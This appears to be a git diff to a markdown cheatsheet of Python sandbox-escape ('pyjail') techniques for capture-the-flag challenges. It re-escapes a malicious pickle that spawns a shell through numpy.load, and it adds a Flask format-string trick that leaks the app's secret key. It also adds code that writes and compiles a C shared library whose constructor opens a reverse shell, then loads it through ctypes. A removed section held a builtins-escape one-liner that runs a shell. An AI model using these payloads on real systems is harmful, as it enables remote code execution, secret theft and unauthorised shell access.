@@ -1,6 +1,6 @@
 ---
 title: 'Pyjail Cheatsheet'
-date: '2024-11-27'
+date: '2025-01-19'
 category: 'cheatsheet'
 description: ''
 tags:
@@ -132,7 +132,7 @@ numpy.fromfile("/flag.txt", dtype=numpy.uint8)
 numpy.rec.fromfile("/flag.txt", formats="i1")
 numpy.loadtxt("/flag.txt") # stderr
 
-numpy.savetxt("/tmp/exp", ["\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x8c\x06system\x93\x94\x94h\x01\x8c\x02sh\x85R."], fmt='%s', encoding="latin-1") # any pickle to execute, ie: `pickora -c 'from os import system; system("sh")'`
+numpy.savetxt("/tmp/exp", ["\\x80\\x04\\x95\\x18\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02os\\x8c\\x06system\\x93\\x94\\x94h\\x01\\x8c\\x02sh\\x85R."], fmt='%s', encoding="latin-1") # any pickle to execute, ie: `pickora -c 'from os import system; system("sh")'`
 numpy.load("/tmp/exp", allow_pickle=True) # https://numpy.org/doc/stable/reference/generated/numpy.load.html
 ```
 
@@ -360,6 +360,36 @@ app # the name of the main program in order to import / "rerun" the program
 antigravity
 ```
 
+### format string
+
+```py
+# leak and access attributes with format string
+import numpy
+import os
+from flask import Flask
+
+app = Flask(__name__)
+app.secret_key = 'SECRET'
+class User():
+    def __init__(self, id, username):
+        self.id = id
+        self.username = username
+    def __repr__(self):
+        return '<User {u.username} (id {{i.id}})>'.format(u=self).format(i=self)
+user = User(0, '{i.__init__.__globals__[app].secret_key}')
+print(user)
+
+# on another, it is also possible to get an RCE w/ file upload or write access
+# - https://corgi.rip/posts/buckeye-writeups/#gentleman
+# - https://ctf.gg/blog/buckeyectf-2024/gentleman
+# - https://yun.ng/c/ctf/2025-uoft-ctf/web/prepared
+open("/tmp/lib.c", "wb").write(b'#include <stdlib.h>\n__attribute__((constructor))\nvoid init() {\nsystem("python3 -c \\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'localhost\', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system(\'/bin/sh\')\\"");\n}')
+os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")
+
+# essentially, write .so / .dll file to system first, then load it as a c library for RCE (important to note that ctypes being loaded as well as file upload or write is neccessary for this to work)
+print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
+```
+
 ### stable payloads
 
 ```py
@@ -407,6 +437,14 @@ antigravity
     - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()`
 
 ## CTF
+
+###
+
+- `jail.py`
+
+```py
+https://ctf.gg/blog/buckeyectf-2024/gentleman
+```
 
 ### SECCON CTF 13: 1linepyjail
 
@@ -1922,20 +1960,6 @@ print(co.co_consts)
 print(id(co.co_consts), id(co.co_names))
 val = eval(co, {'__builtins__': {}}, {})(getattr)
 print(val)
-```
-
-### BYUCTF 2023: Builtins 1
-
-- `b1.py`
-
-```py
-print(eval(input("code> "), {"__builtins__": {}}, {"__builtins__": {}}))
-```
-
-- `solve.py`
-
-```py
-().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")
 ```
 
 ### BYUCTF 2023: Builtins 2
